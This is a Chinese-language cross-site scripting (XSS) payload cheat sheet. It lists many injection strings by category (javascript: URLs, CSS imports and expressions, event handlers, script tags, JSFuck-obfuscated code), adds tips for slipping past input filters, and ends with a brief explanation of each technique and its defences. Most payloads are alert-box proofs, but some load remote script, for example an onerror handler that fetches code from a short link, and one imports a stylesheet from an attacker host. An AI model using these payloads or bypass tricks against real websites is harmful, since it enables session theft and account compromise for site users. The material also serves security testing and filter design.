```javascript
闭合标签:'">这个很有用，
<a href="javascript:alert('test')">link</a>
变为
'"><a href="javascript:alert('test')">link</a>不用管后面是否闭合

#第一类：Javascript URL
<a href="javascript:alert('test')">link</a>
<a href="javascript:alert('xss')">link</a>
<a href='vbscript:MsgBox("XSS")'>link</a>
<a href="vbscript:alert(1)">Hello</a>
<a href="vbscript:alert(1)">Hello</a>
<a href=javascript:alert("XSS")>link</a>
<a href=`javascript:alert("RSnake says,'XSS'")`>link</a>
<a href=javascript:alert(String.fromCharCode(88,83,83))>link</a>
<a href="javascript&colon;alert(1)">link</a>
<a href="javaSCRIPT&colon;alert(1)">Hello</a>
<a href="javasc&NewLine;ript&colon;alert(1)">link</a> 
<a href="javas&Tab;cript:\u0061lert(1);">Hello</a>
<a href="jav    ascript:alert('XSS')">link</a>
<a href="jav&#x09;ascript:alert('XSS')">link</a>
<a href="jav&#x0D;ascript:alert('XSS')">link</a>
<a href="   javascript:alert('XSS');">link</a>
<a href="javascript:\u0061lert&#x28;1&#x29">Hello</a>
<a href="javascript:confirm`1`">link</a>
<a href="javascript:confirm(1)">link</a>
<a href="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1)">1</a>
<a href="javascript:%61%6c%65%72%74%28%31%29">link</a>
<a href="javascript:\u0061\u006C\u0065\u0072\u0074(1)">link</a>
<a href=javascript:eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")>2</a>
<a href=javascript:eval("alert('xss')")>link</a>  
<a href=javascript:alert('XSS')>link</a>
<a href=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>link</a>
<a href=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>link</a>
<a href="data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==">test</a> 
<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>1</a>
<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
#第二类：CSS import
<style>@import url("http://attacker.org/malicious.css");</style>
<style>@imp\ort url("http://attacker.org/malicious.css");</style>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<STYLE>@import'http://jb51.net/xss.css';</STYLE>
#第三类：Inline style
<div style="color: expression(alert('XSS'))">
<div style=color:expression\(alert(1))></div> 
<div style="color: '<'; color: expression(alert('XSS'))">
<div style=X:expression(alert(/xss/))>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<div style="z:exp/*anything*/res/*here*/sion(alert(1))">
<div style=xss:expr/*XSS*/ession(alert('XSS'))>
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
</XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.baidu.com")> 
<img STYLE="background-image:url(javascript:alert('XSS'))"> //ie6  
<img STYLE="background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29"> 
<A STYLE='no\xss:noxss("*//*");xss:ex&#x2F;*XSS*//*/*/pression(alert("XSS"))'>

#第四类：JavaScript 事件
<div onclick="alert('xss')">
<div onmouseenter="alert('xss')">
<div onclick ="alert('xss')">
<BODY ONLOAD=alert('XSS')>
<img src=1 onerror=alert(1)>
<img/src='1'/onerror=alert(0)>
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>
<img src=1 onmouseover=alert('xss') a1=1111> 
<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://t.cn/R5UpyOt';>
<a href="#" onclick=alert('\170\163\163')>test</a>
<a href="#" onclick="\u0061\u006C\u0065\u0072\u0074(1)">link</a>
<a href="#" onclick="\u0061\u006C\u0065\u0072\u0074`a`">link</a>
<a href="#" onclick="alert('xss')">link</a>
<marquee onscroll=alert(1)> test</marquee>
<div  style="width:100px;height:100px;overflow:scroll" onscroll="alert('a')">123456 <br/><br/><br/><br/><br/></div>
<DIV onmousewheel="alert('a')" >123456</DIV><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>
<div style="background-color:red" onmouseenter="alert('a')">123456</div>
<DIV onmouseleave="alert('1')">123456</DIV>
<div contentEditable="true" style="background-color:red" onfocusin="alert('a')" >asdf</div>
<div contentEditable="true" style="background-color:red" onfocusout="alert('bem')" >asdf</div>
<marquee onstart="alert('a')" >asdf</marquee>
<div style="background-color:red;" onbeforecopy="alert('a')" >asdf</div>
<div style="background-color:red;" onbeforecut="alert('a')" >asdf</div>
<div style="background-color:red;" contentEditable="true" onbeforeeditfocus="alert('a')" >asdf</div>
<div style="background-color:red;" ="true" onbeforepaste="alert('a')" >asdf</div>
<div style="background-color:red;" oncontextmenu="alert('a')" >asdf</div>
<div style="background-color:red;" oncopy="alert('a')" >asdf</div>
<div contentEditable="true" style="background-color:red;" oncut="alert('a')" >asdf</div>
<div style="background-color:red;" ondrag="alert('1')" >asdf</div>
<div style="background-color:red;" ondragend="alert('a')" >asdf</div>
<div style="background-color:red;" ondragenter="alert('b')" >asdf</div>
<div contentEditable="true" style="background-color:red;" ondragleave="alert('a')" >asdf</div>
<div contentEditable="true" style="background-color:red;" ondragover="alert('b')" >asdf</div>
<div contentEditable="true" style="background-color:red;" ondragstart="alert('a')" >asdf</div>
<div contentEditable="true" style="background-color:red;" ondrop="alert('b')" >asdf</div> <div contentEditable="true" style="background-color:green;" ondrop="alert('bem')" >asdf</div>
<div contentEditable="true" style="background-color:red;" onlosecapture="alert('b')">asdf</div>
<div contentEditable="true" style="background-color:red;" onpaste="alert('a')" >asdf</div>
<div contentEditable="true" style="background-color:red;" onselectstart="alert('a')" >asdf</div>
<div contentEditable="true" style="background-color:red;" onhelp="alert('a')" >asdf</div>
<div STYLE="background-color:red;behavior:url('#default#time2')" onEnd="alert('a')">asdf</div>
<div STYLE="background-color:red;behavior:url('#default#time2')" onBegin="alert('a')">asdf</div>
<div contentEditable="true" STYLE="background-color:red;" onactivate="alert('b')">asdf</div>
<div contentEditable="true" STYLE="background-color:red;filter: Alpha(opacity=100, style=2);"onfilterchange="alert('b')">asdf</div>
<div contentEditable="true" onbeforeactivate="alert('b')">asdf</div>
<div contentEditable="true" onbeforedeactivate="alert('a')">asdf</div>
<div contentEditable="true" ondeactivate="alert('bem')">asdf</div>
<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />
<audio src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)">
<audio src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)"></audio>
<body onscroll=alert(26)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<input type="hidden" accesskey="X" onclick="alert(/xss/)">


#第五类：Script 标签
<script src="http://baidu.com"></script><script>Function(atob('YWxlcnQoInhzcyIp'))()</script>
<script>alert("XSS")</script>
<scr<script>ipt>alert("XSS")</scr<script>ipt>
<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>
<script>alert(/1/.source)</script>
<script>alert(1);</script>
<script>prompt(1);</script>
<script>confirm(1);</script>
<script>alert(/88199/)</script>
<script>alert(`a`)</script>
<script>alert('a')</script>
<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<script>eval(alert(1))</script>
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</script>
<script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029")</script>
<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>
<script>setTimeout('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>
<script>setTimeout(alert(1),0)</script>
<script>setTimeout`alert\x28\x27 xss \x27\x29`</script>
<script>setInterval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')</script>

<script src=data:text/javascript,alert(1)></script>
<script src=&#100&#97&#116&#97:text/javascript,alert(1)></script>

<script>\u0061\u006C\u0065\u0072\u0074(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>\u0061\u006C\u0065\u0072\u0074`a`</script>
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>
<!--[if]><script>alert(1)</script     -->

<script>alert("xss");;;;;;;;;;;;;;;;;    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>
<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```


```javascript
<a>标签
<a href=javascript:alert(1)>111</a>

<img>标签
<img src=https://www.baidu.com/img/flexible/logo/pc/result.png>
<img src=x onerror=alert('XSS')>//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>

<input>标签
<input onmouseover=alert(1) />

<script>标签
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>

alert被过滤，可以prompt、confirm、console.log替换使用：
如果都被过滤，可以换个方式绕过

<input onmouseover=top[11189117..toString(32)](2222) />
onmouseover=top[11189117..toString(32)](2222)
onmouseover=top[11189117..toString(32)](2222)
onmouseover="setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))"

```

```javascript
常用payload分享

<script>alert('1')</script>
onmousemove=top[11189117..toString(32)](2222)
onmouseover=top[11189117..toString(32)](2222)
onclick=……………………等等
onmousemove='alert(1111)'a="
<script>top[11189117..toString(32)](2222)</script>
<ScRiPt>top[11189117..toString(32)](2222)</ScRiPt>
%3cscript%3ealert(1111)%3c/script%3e
<Script>\u0061\u006C\u0065\u0072\u0074(1111)</Script>

<a href="javascript:alert('test')">link</a>

<img src=java\0script:alert`1111`>
<img src=x onerror=alert`1111`>
%3Cimg+src%3Dx+onerror%3Dtop[11189117..toString(32)]%601111%60%3E

JavaScript编码
<script>alert(String.fromCharCode(88,83,83))</script>
字符拼接
<img src="x" onerror="a= `aler` ;b=`t` ;c='(`xss`);';eval(a+b+c)">
字符拼接和动态执行
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
href标签可以用
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;

实体编码绕过之注释绕过
<!--<script>alert(1)</script>-->
<--<script>alert(1)</script>-->

<svg onload=alert(cookie)>


好像与微信有关也可以弹窗
weixin:alert(1)

1、如果()被过滤，可以用//和``替代
2、如果<>被过滤，可以用3c和%3e替代
3、如果‘“引号被过滤，可以用%27或%22替代
4、如果alert等被过滤，可以用其他方式代替，或者编码，或者上面提到的那些事件
5、如果scrip被过滤，可以用a标签或者img或者input标签替代绕过


```

这些Payload展示了现代XSS攻击的多种高级绕过技术，我将从技术原理和防御角度进行系统分析：

#### 一、JavaScript执行上下文绕过

##### 1. 事件处理器变体
`onmousemove=top[11189117..toString(32)](2222)  onmouseover=top[11189117..toString(32)](2222)`
- **技术原理**：利用`11189117..toString(32)`计算得到字符串"alert"，通过`top[]`动态调用
- **防御要点**：需同时过滤事件属性和非常规的JavaScript调用方式
##### 2. Unicode编码混淆
`<Script>\u0061\u006C\u0065\u0072\u0074(1111)</Script>`
- **绕过能力**：可突破简单关键字过滤（如alert）
- **检测建议**：解码后二次检测

#### 二、标签构造技术演进

##### 1. 大小写混合
`<ScRiPt>top[11189117..toString(32)](2222)</ScRiPt>`
- **现状**：现代浏览器已统一转换为小写，但部分WAF仍可能被绕过
##### 2. URL编码
`%3cscript%3ealert(1111)%3c/script%3e`
- **应用场景**：适用于URL参数注入场景
- **防御方案**：输入解码后检测
##### 3. 空字节注入
``<img src=java\0script:alert`1111`>``
- **原理**：利用\0截断过滤检测
- **2025风险**：主流浏览器已修复

#### 三、符号替代体系
1. **括号替代方案**
    ``alert`1111`  // 反引号模板字符串 alert//1111  // 利用注释``
2. **引号绕过技术**
    `onmousemove='alert(1111)'a="`
    - 利用未闭合的引号构造有效语法
3. **标签符号编码**
    `%3Cimg+src%3Dx+onerror%3Dalert%601111%60%3E`